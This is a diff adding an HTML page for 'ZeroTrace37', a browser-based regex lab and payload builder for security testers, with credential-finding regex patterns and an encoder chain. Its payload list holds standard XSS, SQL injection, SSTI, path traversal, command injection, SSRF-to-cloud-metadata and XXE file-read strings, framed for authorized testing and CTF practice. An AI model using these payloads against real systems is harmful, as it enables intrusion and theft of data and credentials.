@@ -1,0 +1,514 @@
+<!DOCTYPE html>
+<html lang="de">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>ZeroTrace37 — Regex &amp; Payload Builder</title>
+<meta name="description" content="Free browser tool for security testers: regex lab with live matching and a payload builder with an encoder chain. Authorized testing only.">
+<style>
+  :root{
+    --bg:#0a0c10; --panel:#11141b; --panel-2:#161a23; --line:#232a37;
+    --txt:#c9d4e5; --muted:#6b7789; --accent:#39ff88; --accent-dim:#1f9c56;
+    --warn:#ff5b5b; --amber:#ffb347; --blue:#5cc8ff;
+    --mono:"SFMono-Regular",ui-monospace,"JetBrains Mono","Fira Code",Consolas,monospace;
+  }
+  *{box-sizing:border-box}
+  html,body{margin:0;background:var(--bg);color:var(--txt);
+    font-family:var(--mono);font-size:14px;line-height:1.5;-webkit-font-smoothing:antialiased}
+  a{color:var(--accent);text-decoration:none}
+  a:hover{text-decoration:underline}
+  .wrap{max-width:1100px;margin:0 auto;padding:0 16px}
+
+  /* Header */
+  header{border-bottom:1px solid var(--line);background:linear-gradient(180deg,#0d1017,#0a0c10);
+    position:sticky;top:0;z-index:20}
+  .bar{display:flex;align-items:center;justify-content:space-between;padding:14px 16px;
+    max-width:1100px;margin:0 auto;gap:12px;flex-wrap:wrap}
+  .brand{display:flex;align-items:center;gap:10px;font-weight:700;letter-spacing:.5px}
+  .dot{width:9px;height:9px;border-radius:50%;background:var(--accent);
+    box-shadow:0 0 10px var(--accent);animation:pulse 2s infinite}
+  @keyframes pulse{0%,100%{opacity:1}50%{opacity:.35}}
+  .brand small{color:var(--muted);font-weight:400;letter-spacing:0}
+  .hright{display:flex;align-items:center;gap:12px;flex-wrap:wrap}
+  .langtog{display:flex;border:1px solid var(--line);border-radius:6px;overflow:hidden}
+  .lt{padding:6px 10px;font-size:12px;color:var(--muted);cursor:pointer;user-select:none}
+  .lt+.lt{border-left:1px solid var(--line)}
+  .lt.on{color:var(--accent);background:rgba(57,255,136,.10)}
+  .cta{font-size:12.5px;padding:7px 12px;border:1px solid var(--accent-dim);border-radius:6px;
+    color:var(--accent);background:rgba(57,255,136,.06)}
+  .cta:hover{background:rgba(57,255,136,.14);text-decoration:none}
+
+  /* Warn strip */
+  .strip{font-size:12px;color:var(--amber);background:rgba(255,179,71,.07);
+    border-bottom:1px solid var(--line);text-align:center;padding:6px 16px}
+
+  /* Tabs */
+  .tabs{display:flex;gap:2px;margin:18px 0 0;border-bottom:1px solid var(--line)}
+  .tab{padding:10px 18px;cursor:pointer;color:var(--muted);border:1px solid transparent;
+    border-bottom:none;border-radius:6px 6px 0 0;font-size:13px;user-select:none}
+  .tab.active{color:var(--accent);background:var(--panel);border-color:var(--line);
+    border-bottom:1px solid var(--panel);margin-bottom:-1px}
+  .view{display:none;padding:20px 0 10px}
+  .view.active{display:block}
+
+  /* Panels & controls */
+  .grid{display:grid;gap:14px}
+  @media(min-width:820px){.two{grid-template-columns:1fr 1fr}}
+  .panel{background:var(--panel);border:1px solid var(--line);border-radius:8px;padding:14px}
+  .label{font-size:11px;text-transform:uppercase;letter-spacing:1px;color:var(--muted);
+    margin:0 0 6px;display:block}
+  input[type=text],input[type=email],textarea,select{width:100%;background:var(--panel-2);border:1px solid var(--line);
+    color:var(--txt);font-family:var(--mono);font-size:13.5px;border-radius:6px;padding:10px}
+  input:focus,textarea:focus,select:focus{outline:none;border-color:var(--accent-dim)}
+  textarea{resize:vertical;min-height:120px}
+  .row{display:flex;gap:10px;align-items:center;flex-wrap:wrap}
+  .flags{display:flex;gap:6px;flex-wrap:wrap}
+  .chip{font-size:12px;padding:5px 9px;border:1px solid var(--line);border-radius:5px;
+    color:var(--muted);cursor:pointer;user-select:none;background:var(--panel-2)}
+  .chip.on{color:var(--accent);border-color:var(--accent-dim);background:rgba(57,255,136,.08)}
+  .btn{font-family:var(--mono);font-size:12.5px;padding:8px 12px;border:1px solid var(--line);
+    background:var(--panel-2);color:var(--txt);border-radius:6px;cursor:pointer}
+  .btn:hover{border-color:var(--accent-dim);color:var(--accent)}
+  .stat{font-size:12px;color:var(--muted)}
+  .stat b{color:var(--accent)}
+  mark{background:rgba(57,255,136,.28);color:#eafff2;border-radius:2px;padding:0 1px}
+  .out{background:var(--panel-2);border:1px solid var(--line);border-radius:6px;padding:12px;
+    white-space:pre-wrap;word-break:break-word;min-height:120px;font-size:13.5px}
+  .err{color:var(--warn)}
+  .groups{margin-top:10px;font-size:12.5px;color:var(--muted)}
+  .groups code{color:var(--blue)}
+
+  /* Snippet / payload lists */
+  .list{max-height:340px;overflow:auto;border:1px solid var(--line);border-radius:6px;background:var(--panel-2)}
+  .item{padding:9px 11px;border-bottom:1px solid var(--line);cursor:pointer;
+    display:flex;justify-content:space-between;gap:10px;align-items:flex-start}
+  .item:last-child{border-bottom:none}
+  .item:hover{background:rgba(57,255,136,.05)}
+  .item .name{color:var(--txt)}
+  .item .val{color:var(--muted);font-size:12px;word-break:break-all;flex:1}
+  .item .cp{color:var(--muted);font-size:11px;white-space:nowrap}
+  .item:hover .cp{color:var(--accent)}
+  .cat{display:flex;gap:6px;flex-wrap:wrap;margin-bottom:10px}
+  .enc-chain{display:flex;flex-direction:column;gap:8px}
+  .enc-row{display:flex;gap:8px;align-items:center;flex-wrap:wrap}
+
+  /* Opt-in */
+  .optin{margin:26px 0;background:linear-gradient(135deg,#0e1620,#11141b);
+    border:1px solid var(--accent-dim);border-radius:10px;padding:20px}
+  .optin h3{margin:0 0 6px;color:var(--accent);font-size:16px}
+  .optin p{margin:0 0 12px;color:var(--muted);font-size:13px}
+  .optin form{display:flex;gap:10px;flex-wrap:wrap}
+  .optin input{flex:1;min-width:220px}
+  .optin .btn{background:var(--accent);color:#062412;border-color:var(--accent);font-weight:700}
+  .optin .btn:hover{background:#5affa0;color:#062412}
+  .optin .msg{margin-top:10px;font-size:12.5px}
+
+  footer{border-top:1px solid var(--line);margin-top:30px;padding:22px 0;color:var(--muted);font-size:12px}
+  footer .wrap{display:flex;justify-content:space-between;gap:14px;flex-wrap:wrap}
+  .toast{position:fixed;bottom:20px;left:50%;transform:translateX(-50%);
+    background:var(--accent);color:#062412;font-weight:700;padding:9px 16px;border-radius:6px;
+    font-size:13px;opacity:0;pointer-events:none;transition:opacity .2s;z-index:50}
+  .toast.show{opacity:1}
+</style>
+</head>
+<body>
+<header>
+  <div class="bar">
+    <div class="brand"><span class="dot"></span>ZeroTrace37 <small>// Regex &amp; Payload Builder</small></div>
+    <div class="hright">
+      <div class="langtog" id="langtog">
+        <span class="lt" data-lang="de">DE</span>
+        <span class="lt" data-lang="en">EN</span>
+      </div>
+      <a class="cta" href="https://tracekeeper.gumroad.com" target="_blank" rel="noopener" data-i18n="cta">Alle Tools →</a>
+    </div>
+  </div>
+</header>
+<div class="strip" data-i18n="warn">Nur für autorisierte Sicherheitstests &amp; Ausbildung. Kein Einsatz gegen Systeme ohne ausdrückliche Erlaubnis.</div>
+
+<div class="wrap">
+  <div class="tabs">
+    <div class="tab active" data-tab="regex">Regex Lab</div>
+    <div class="tab" data-tab="payload">Payload Builder</div>
+  </div>
+
+  <!-- ================= REGEX LAB ================= -->
+  <section class="view active" id="regex">
+    <div class="grid two">
+      <div class="panel">
+        <label class="label" data-i18n="l_pattern">Pattern</label>
+        <div class="row" style="margin-bottom:10px">
+          <input type="text" id="rx" placeholder="([a-z0-9._%+-]+)@([a-z0-9.-]+)" spellcheck="false" autocomplete="off">
+        </div>
+        <label class="label" data-i18n="l_flags">Flags</label>
+        <div class="flags" id="flags">
+          <span class="chip on" data-f="g">g global</span>
+          <span class="chip on" data-f="i">i insensitive</span>
+          <span class="chip" data-f="m">m multiline</span>
+          <span class="chip" data-f="s">s dotall</span>
+          <span class="chip" data-f="u">u unicode</span>
+        </div>
+        <div class="row" style="margin-top:12px;justify-content:space-between">
+          <span class="stat" id="rxstat"></span>
+          <button class="btn" id="rxclear" data-i18n="b_reset">Reset</button>
+        </div>
+        <div class="groups" id="rxgroups"></div>
+      </div>
+      <div class="panel">
+        <label class="label" data-i18n="l_testtext">Test-Text</label>
+        <textarea id="rxtext" spellcheck="false" data-i18n-ph="ph_testtext" placeholder="Text hier einfügen ...">admin@target.tld
+support@sub.target.tld
+192.168.4.21  10.0.0.1
+Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.payload.sig
+https://target.tld/api/v2/users?id=42</textarea>
+        <label class="label" style="margin-top:12px">Highlight</label>
+        <div class="out" id="rxout"></div>
+      </div>
+    </div>
+
+    <div class="panel" style="margin-top:14px">
+      <label class="label" data-i18n="l_reconlib">Recon-Pattern-Bibliothek — klicken zum Laden</label>
+      <div class="list" id="rxlib"></div>
+    </div>
+  </section>
+
+  <!-- ================= PAYLOAD BUILDER ================= -->
+  <section class="view" id="payload">
+    <div class="panel">
+      <label class="label" data-i18n="l_category">Kategorie</label>
+      <div class="cat" id="pcat"></div>
+      <div class="list" id="plist"></div>
+      <p class="stat" style="margin-top:10px" data-i18n="p_payinfo">Kanonische Test-Strings für autorisierte Web-Assessments &amp; CTF/Lab-Übungen. Klick kopiert &amp; lädt in den Encoder.</p>
+    </div>
+
+    <div class="panel" style="margin-top:14px">
+      <label class="label" data-i18n="l_encoder">Encoder-Kette</label>
+      <textarea id="encin" spellcheck="false" data-i18n-ph="ph_encin" placeholder="...">&lt;script&gt;alert(1)&lt;/script&gt;</textarea>
+      <div class="enc-chain" style="margin-top:12px">
+        <div class="enc-row">
+          <button class="btn" data-enc="url">URL-Encode</button>
+          <button class="btn" data-enc="url2">Double-URL</button>
+          <button class="btn" data-enc="b64">Base64</button>
+          <button class="btn" data-enc="b64d">Base64 decode</button>
+          <button class="btn" data-enc="html">HTML-Entities</button>
+          <button class="btn" data-enc="uni">\u Unicode</button>
+          <button class="btn" data-enc="hex">Hex \x</button>
+          <button class="btn" data-enc="urld">URL-Decode</button>
+        </div>
+      </div>
+      <label class="label" style="margin-top:14px">Output</label>
+      <div class="out" id="encout"></div>
+      <div class="row" style="margin-top:10px">
+        <button class="btn" id="enccopy" data-i18n="b_copyout">Output kopieren</button>
+        <button class="btn" id="encreset" data-i18n="b_reset">Reset</button>
+      </div>
+    </div>
+  </section>
+
+  <!-- ================= OPT-IN ================= -->
+  <div class="optin">
+    <h3 data-i18n="o_h3">Neue Tools zuerst bekommen</h3>
+    <p data-i18n="o_p">Ein bis zwei Mails im Monat: neue kostenlose Tools, Recon-Tricks und Updates aus der ZeroTrace37-Werkbank. Kein Spam, jederzeit abbestellbar.</p>
+    <form id="optform" action="https://formspree.io/f/xqpabzyl" method="POST">
+      <input type="email" name="email" data-i18n-ph="ph_email" placeholder="deine@mail.tld" required>
+      <button class="btn" type="submit" data-i18n="o_btn">Eintragen</button>
+    </form>
+    <div class="msg" id="optmsg"></div>
+  </div>
+</div>
+
+<footer>
+  <div class="wrap">
+    <div>ZeroTrace37 &middot; Security Tooling &middot; <a href="https://zerotrace37.com" target="_blank" rel="noopener">zerotrace37.com</a> &middot; <a href="https://tracekeeper.gumroad.com" target="_blank" rel="noopener">Shop</a></div>
+    <div data-i18n="f_browser">Läuft 100% im Browser. Keine Daten verlassen dein Gerät.</div>
+  </div>
+</footer>
+
+<div class="toast" id="toast"></div>
+
+<script>
+(function(){
+  "use strict";
+  var $=function(s,r){return (r||document).querySelector(s)};
+  var $$=function(s,r){return Array.prototype.slice.call((r||document).querySelectorAll(s))};
+
+  /* ---------- i18n ---------- */
+  var T={
+    de:{
+      cta:"Alle Tools →",
+      warn:"Nur für autorisierte Sicherheitstests & Ausbildung. Kein Einsatz gegen Systeme ohne ausdrückliche Erlaubnis.",
+      l_pattern:"Pattern", l_flags:"Flags", b_reset:"Reset",
+      l_testtext:"Test-Text", ph_testtext:"Text hier einfügen — Logs, Responses, Wordlists ...",
+      l_reconlib:"Recon-Pattern-Bibliothek — klicken zum Laden",
+      l_category:"Kategorie",
+      p_payinfo:"Kanonische Test-Strings für autorisierte Web-Assessments & CTF/Lab-Übungen. Klick kopiert & lädt in den Encoder.",
+      l_encoder:"Encoder-Kette", ph_encin:"Payload / String hier eingeben oder oben auswählen ...",
+      b_copyout:"Output kopieren",
+      o_h3:"Neue Tools zuerst bekommen",
+      o_p:"Ein bis zwei Mails im Monat: neue kostenlose Tools, Recon-Tricks und Updates aus der ZeroTrace37-Werkbank. Kein Spam, jederzeit abbestellbar.",
+      ph_email:"deine@mail.tld", o_btn:"Eintragen",
+      f_browser:"Läuft 100% im Browser. Keine Daten verlassen dein Gerät.",
+      matches:"Treffer", groups:"Gruppen (erste 5):", invalid:"Ungültiges Pattern: ", error:"Fehler",
+      copied:"kopiert", load:"laden", copy:"kopieren",
+      m_invalid:"Bitte gültige E-Mail eingeben.", m_sending:"Sende ...",
+      m_ok:"Eingetragen. Willkommen an Bord — neue Tools landen bald in deinem Postfach.",
+      m_send_err:"Fehler beim Senden. Bitte später erneut versuchen.",
+      m_net_err:"Netzwerkfehler. Bitte später erneut versuchen."
+    },
+    en:{
+      cta:"All Tools →",
+      warn:"For authorized security testing & education only. Do not use against systems without explicit permission.",
+      l_pattern:"Pattern", l_flags:"Flags", b_reset:"Reset",
+      l_testtext:"Test text", ph_testtext:"Paste text here — logs, responses, wordlists ...",
+      l_reconlib:"Recon pattern library — click to load",
+      l_category:"Category",
+      p_payinfo:"Canonical test strings for authorized web assessments & CTF/lab practice. Click copies & loads into the encoder.",
+      l_encoder:"Encoder chain", ph_encin:"Enter a payload / string, or pick one above ...",
+      b_copyout:"Copy output",
+      o_h3:"Get new tools first",
+      o_p:"One or two emails a month: new free tools, recon tricks and updates from the ZeroTrace37 workbench. No spam, unsubscribe anytime.",
+      ph_email:"you@mail.tld", o_btn:"Subscribe",
+      f_browser:"Runs 100% in your browser. No data leaves your device.",
+      matches:"matches", groups:"Groups (first 5):", invalid:"Invalid pattern: ", error:"Error",
+      copied:"copied", load:"load", copy:"copy",
+      m_invalid:"Please enter a valid email.", m_sending:"Sending ...",
+      m_ok:"Subscribed. Welcome aboard — new tools will hit your inbox soon.",
+      m_send_err:"Send failed. Please try again later.",
+      m_net_err:"Network error. Please try again later."
+    }
+  };
+  var saved=null; try{saved=localStorage.getItem("zt_lang")}catch(e){}
+  var LANG = (saved==="de"||saved==="en") ? saved
+    : ((navigator.language||"en").toLowerCase().indexOf("de")===0 ? "de" : "en");
+  function t(k){return (T[LANG]&&T[LANG][k]!=null)?T[LANG][k]:((T.en&&T.en[k]!=null)?T.en[k]:k)}
+  function nm(o){return typeof o==="string"?o:(o[LANG]||o.en)}
+
+  function applyI18n(){
+    document.documentElement.lang=LANG;
+    $$("[data-i18n]").forEach(function(el){var k=el.getAttribute("data-i18n");if(T[LANG][k]!=null)el.textContent=T[LANG][k]});
+    $$("[data-i18n-ph]").forEach(function(el){var k=el.getAttribute("data-i18n-ph");if(T[LANG][k]!=null)el.setAttribute("placeholder",T[LANG][k])});
+    $$("#langtog .lt").forEach(function(b){b.classList.toggle("on",b.dataset.lang===LANG)});
+    renderRxLib(); renderPayloads(); runRegex();
+  }
+  $$("#langtog .lt").forEach(function(b){
+    b.addEventListener("click",function(){LANG=b.dataset.lang;
+      try{localStorage.setItem("zt_lang",LANG)}catch(e){} applyI18n()});
+  });
+
+  /* ---------- Tabs ---------- */
+  $$(".tab").forEach(function(t){
+    t.addEventListener("click",function(){
+      $$(".tab").forEach(function(x){x.classList.remove("active")});
+      $$(".view").forEach(function(x){x.classList.remove("active")});
+      t.classList.add("active");
+      $("#"+t.dataset.tab).classList.add("active");
+    });
+  });
+
+  /* ---------- Toast ---------- */
+  var toast=$("#toast"),tt;
+  function ping(msg){toast.textContent=msg||t("copied");toast.classList.add("show");
+    clearTimeout(tt);tt=setTimeout(function(){toast.classList.remove("show")},1100)}
+  function copy(text){
+    if(navigator.clipboard&&navigator.clipboard.writeText){navigator.clipboard.writeText(text).then(function(){ping()})}
+    else{var ta=document.createElement("textarea");ta.value=text;document.body.appendChild(ta);
+      ta.select();try{document.execCommand("copy")}catch(e){}document.body.removeChild(ta);ping()}
+  }
+
+  /* ---------- Regex Lab ---------- */
+  var rx=$("#rx"),rxtext=$("#rxtext"),rxout=$("#rxout"),
+      rxstat=$("#rxstat"),rxgroups=$("#rxgroups");
+  function activeFlags(){return $$("#flags .chip.on").map(function(c){return c.dataset.f}).join("")}
+  function esc(s){return s.replace(/[&<>]/g,function(c){return {"&":"&amp;","<":"&lt;",">":"&gt;"}[c]})}
+
+  function runRegex(){
+    var pat=rx.value,text=rxtext.value,flags=activeFlags();
+    rxgroups.innerHTML="";
+    if(!pat){rxout.innerHTML=esc(text);rxstat.innerHTML="<b>0</b> "+t("matches");return}
+    var re;
+    try{ if(flags.indexOf("g")===-1) flags+="g"; re=new RegExp(pat,flags); }
+    catch(e){rxout.innerHTML='<span class="err">'+t("invalid")+esc(e.message)+"</span>";
+      rxstat.textContent=t("error");return}
+    var count=0,html="",last=0,m,groupsSeen=[],guard=0;
+    re.lastIndex=0;
+    while((m=re.exec(text))!==null){
+      if(guard++>50000)break;
+      count++;
+      html+=esc(text.slice(last,m.index))+"<mark>"+esc(m[0]||"")+"</mark>";
+      last=m.index+(m[0]?m[0].length:0);
+      if(count<=5&&m.length>1){
+        var g=m.slice(1).map(function(x,i){return "<code>$"+(i+1)+"</code>="+esc(x===undefined?"∅":x)}).join("  ");
+        groupsSeen.push("#"+count+": "+g);
+      }
+      if(m[0]==="")re.lastIndex++;
+    }
+    html+=esc(text.slice(last));
+    rxout.innerHTML=html||esc(text);
+    rxstat.innerHTML="<b>"+count+"</b> "+t("matches");
+    if(groupsSeen.length) rxgroups.innerHTML=t("groups")+"<br>"+groupsSeen.join("<br>");
+  }
+  rx.addEventListener("input",runRegex);
+  rxtext.addEventListener("input",runRegex);
+  $$("#flags .chip").forEach(function(c){c.addEventListener("click",function(){c.classList.toggle("on");runRegex()})});
+  $("#rxclear").addEventListener("click",function(){rx.value="";rxtext.value="";runRegex()});
+
+  var rxLib=[
+    {name:"E-Mail",              val:"[a-zA-Z0-9._%+\\-]+@[a-zA-Z0-9.\\-]+\\.[a-zA-Z]{2,}"},
+    {name:"IPv4",               val:"\\b(?:\\d{1,3}\\.){3}\\d{1,3}\\b"},
+    {name:"URL (http/s)",       val:"https?:\\/\\/[^\\s\"'<>]+"},
+    {name:"JWT",                val:"eyJ[A-Za-z0-9_\\-]+\\.[A-Za-z0-9_\\-]+\\.[A-Za-z0-9_\\-]+"},
+    {name:"AWS Access Key",     val:"AKIA[0-9A-Z]{16}"},
+    {name:{de:"Bearer-Token",en:"Bearer token"}, val:"[Bb]earer\\s+[A-Za-z0-9._\\-]+"},
+    {name:"UUID v4",            val:"[0-9a-f]{8}-[0-9a-f]{4}-4[0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}"},
+    {name:{de:"MD5/SHA-Hash",en:"MD5/SHA hash"}, val:"\\b[a-fA-F0-9]{32,64}\\b"},
+    {name:"Private Key Header", val:"-----BEGIN (?:RSA |EC |OPENSSH |PGP )?PRIVATE KEY-----"},
+    {name:{de:"Query-Parameter",en:"Query parameter"}, val:"[?&]([a-zA-Z0-9_\\-]+)=([^&\\s]*)"},
+    {name:{de:"Versteckte Kommentare (HTML)",en:"Hidden comments (HTML)"}, val:"<!--[\\s\\S]*?-->"},
+    {name:"S3-Bucket-URL",      val:"[a-z0-9.\\-]+\\.s3[.\\-][a-z0-9.\\-]*amazonaws\\.com"},
+    {name:{de:"Interne IP (RFC1918)",en:"Internal IP (RFC1918)"}, val:"\\b(?:10\\.\\d{1,3}|172\\.(?:1[6-9]|2\\d|3[01])|192\\.168)\\.\\d{1,3}\\.\\d{1,3}\\b"}
+  ];
+  var rxlibEl=$("#rxlib");
+  function renderRxLib(){
+    rxlibEl.innerHTML="";
+    rxLib.forEach(function(s){
+      var d=document.createElement("div");d.className="item";
+      d.innerHTML='<span class="name">'+esc(nm(s.name))+'</span><span class="val">'+esc(s.val)+'</span><span class="cp">'+t("load")+'</span>';
+      d.addEventListener("click",function(){rx.value=s.val;runRegex();
+        document.getElementById("regex").scrollIntoView({behavior:"smooth",block:"start"})});
+      rxlibEl.appendChild(d);
+    });
+  }
+
+  /* ---------- Payload Builder ---------- */
+  /* Kanonische, öffentlich dokumentierte Test-Strings (PayloadsAllTheThings-Klasse).
+     Zweck: autorisierte Assessments, CTFs, Labs, WAF-/Filter-Verifikation.
+     Hinweis: </script> in JS-Strings als <\/script> escaped, sonst bricht der HTML-Parser. */
+  var PAYLOADS={
+    "XSS":[
+      {name:"Basic alert",        val:"<script>alert(1)<\/script>"},
+      {name:"IMG onerror",        val:"<img src=x onerror=alert(1)>"},
+      {name:"SVG onload",         val:"<svg onload=alert(1)>"},
+      {name:{de:"Attribut-Breakout",en:"Attribute breakout"}, val:"\"><script>alert(1)<\/script>"},
+      {name:{de:"JS-Kontext",en:"JS context"}, val:"';alert(1);//"},
+      {name:"Body onload",        val:"<body onload=alert(1)>"},
+      {name:"Polyglot",           val:"jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//"}
+    ],
+    "SQLi":[
+      {name:{de:"Auth-Bypass klassisch",en:"Auth bypass (classic)"}, val:"' OR '1'='1"},
+      {name:{de:"Auth-Bypass Kommentar",en:"Auth bypass (comment)"}, val:"admin'-- -"},
+      {name:{de:"UNION-Probe",en:"UNION probe"}, val:"' UNION SELECT NULL-- -"},
+      {name:{de:"Boolean-Test",en:"Boolean test"}, val:"' AND 1=1-- -"},
+      {name:"Time-based (MySQL)", val:"' AND SLEEP(5)-- -"},
+      {name:{de:"Fehler-basiert",en:"Error-based"}, val:"'"},
+      {name:{de:"ORDER BY Spaltenzahl",en:"ORDER BY column count"}, val:"' ORDER BY 3-- -"}
+    ],
+    "SSTI":[
+      {name:{de:"Erkennung",en:"Detection"}, val:"${7*7}"},
+      {name:"Jinja2/Twig",        val:"{{7*7}}"},
+      {name:"Jinja2 config",      val:"{{config}}"},
+      {name:"Freemarker",         val:"<#assign x=1>${x}"},
+      {name:"Velocity",           val:"#set($x=7*7)$x"}
+    ],
+    "Path Traversal / LFI":[
+      {name:"etc/passwd",         val:"../../../../etc/passwd"},
+      {name:"Windows hosts",      val:"..\\..\\..\\..\\windows\\win.ini"},
+      {name:"URL-encoded",        val:"..%2f..%2f..%2fetc%2fpasswd"},
+      {name:{de:"Null-Byte (Legacy)",en:"Null byte (legacy)"}, val:"../../../../etc/passwd%00"},
+      {name:{de:"PHP-Wrapper",en:"PHP wrapper"}, val:"php://filter/convert.base64-encode/resource=index.php"}
+    ],
+    "Command Injection":[
+      {name:{de:"Semikolon",en:"Semicolon"}, val:"; id"},
+      {name:"Pipe",               val:"| id"},
+      {name:"Backticks",          val:"`id`"},
+      {name:"Subshell",           val:"$(id)"},
+      {name:{de:"AND-Verkettung",en:"AND chaining"}, val:"&& whoami"},
+      {name:"Newline",            val:"%0aid"}
+    ],
+    "SSRF":[
+      {name:"AWS Metadata",       val:"http://169.254.169.254/latest/meta-data/"},
+      {name:"Localhost",          val:"http://127.0.0.1:80/"},
+      {name:{de:"Decimal-IP-Bypass",en:"Decimal IP bypass"}, val:"http://2130706433/"},
+      {name:{de:"file:// Schema",en:"file:// scheme"}, val:"file:///etc/passwd"},
+      {name:"GCP Metadata",       val:"http://metadata.google.internal/computeMetadata/v1/"}
+    ],
+    "XXE":[
+      {name:{de:"File-Read",en:"File read"}, val:"<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"file:///etc/passwd\">]><r>&x;</r>"},
+      {name:"SSRF via XXE",       val:"<!DOCTYPE r [<!ENTITY x SYSTEM \"http://127.0.0.1/\">]><r>&x;</r>"}
+    ],
+    "Open Redirect":[
+      {name:{de:"Protokoll-relativ",en:"Protocol-relative"}, val:"//evil.example"},
+      {name:{de:"Whitelist-Bypass",en:"Whitelist bypass"}, val:"https://trusted.tld.evil.example"},
+      {name:"@-Trick",            val:"https://trusted.tld@evil.example"}
+    ]
+  };
+
+  var pcat=$("#pcat"),plist=$("#plist"),cats=Object.keys(PAYLOADS),curCat=cats[0];
+  cats.forEach(function(c,i){
+    var s=document.createElement("span");s.className="chip"+(i===0?" on":"");s.textContent=c;
+    s.addEventListener("click",function(){curCat=c;
+      $$("#pcat .chip").forEach(function(x){x.classList.remove("on")});s.classList.add("on");renderPayloads()});
+    pcat.appendChild(s);
+  });
+  function renderPayloads(){
+    plist.innerHTML="";
+    PAYLOADS[curCat].forEach(function(p){
+      var d=document.createElement("div");d.className="item";
+      d.innerHTML='<span class="name">'+esc(nm(p.name))+'</span><span class="val">'+esc(p.val)+'</span><span class="cp">'+t("copy")+'</span>';
+      d.addEventListener("click",function(){copy(p.val);encin.value=p.val;runEnc(lastEnc)});
+      plist.appendChild(d);
+    });
+  }
+
+  /* ---------- Encoder ---------- */
+  var encin=$("#encin"),encout=$("#encout"),lastEnc=null;
+  function toHexU(s){return s.split("").map(function(c){return "\\u"+("000"+c.charCodeAt(0).toString(16)).slice(-4)}).join("")}
+  function toHexX(s){return s.split("").map(function(c){return "\\x"+("0"+c.charCodeAt(0).toString(16)).slice(-2)}).join("")}
+  function htmlEnt(s){return s.replace(/[&<>"'`]/g,function(c){return "&#"+c.charCodeAt(0)+";"})}
+  function b64e(s){try{return btoa(unescape(encodeURIComponent(s)))}catch(e){return "[error]"}}
+  function b64d(s){try{return decodeURIComponent(escape(atob(s.trim())))}catch(e){return "[invalid base64]"}}
+  function runEnc(kind){
+    var s=encin.value,o=s;lastEnc=kind;
+    switch(kind){
+      case "url": o=encodeURIComponent(s);break;
+      case "url2":o=encodeURIComponent(encodeURIComponent(s));break;
+      case "urld":try{o=decodeURIComponent(s)}catch(e){o="[decode error]"}break;
+      case "b64": o=b64e(s);break;
+      case "b64d":o=b64d(s);break;
+      case "html":o=htmlEnt(s);break;
+      case "uni": o=toHexU(s);break;
+      case "hex": o=toHexX(s);break;
+      default: o=s;
+    }
+    encout.textContent=o;
+  }
+  $$("[data-enc]").forEach(function(b){b.addEventListener("click",function(){runEnc(b.dataset.enc)})});
+  encin.addEventListener("input",function(){if(lastEnc)runEnc(lastEnc);else encout.textContent=encin.value});
+  $("#enccopy").addEventListener("click",function(){copy(encout.textContent||encin.value)});
+  $("#encreset").addEventListener("click",function(){encin.value="";encout.textContent="";lastEnc=null});
+
+  /* ---------- Opt-in (Formspree AJAX) ---------- */
+  var optform=$("#optform"),optmsg=$("#optmsg");
+  optform.addEventListener("submit",function(e){
+    e.preventDefault();
+    var input=optform.querySelector("input"),val=input.value.trim();
+    if(!val||val.indexOf("@")<1){optmsg.style.color="var(--warn)";optmsg.textContent=t("m_invalid");return}
+    var btn=optform.querySelector("button");btn.disabled=true;
+    optmsg.style.color="var(--muted)";optmsg.textContent=t("m_sending");
+    fetch(optform.getAttribute("action"),{
+      method:"POST",body:new FormData(optform),headers:{"Accept":"application/json"}
+    }).then(function(r){
+      btn.disabled=false;
+      if(r.ok){optmsg.style.color="var(--accent)";optmsg.textContent=t("m_ok");optform.reset();}
+      else{r.json().then(function(d){optmsg.style.color="var(--warn)";
+        optmsg.textContent=(d&&d.errors&&d.errors[0]&&d.errors[0].message)||t("m_send_err")})
+        .catch(function(){optmsg.style.color="var(--warn)";optmsg.textContent=t("m_send_err")})}
+    }).catch(function(){btn.disabled=false;optmsg.style.color="var(--warn)";optmsg.textContent=t("m_net_err")});
+  });
+
+  /* ---------- init ---------- */
+  applyI18n();
+  encout.textContent=encin.value;
+})();
+</script>
+</body>
+</html>
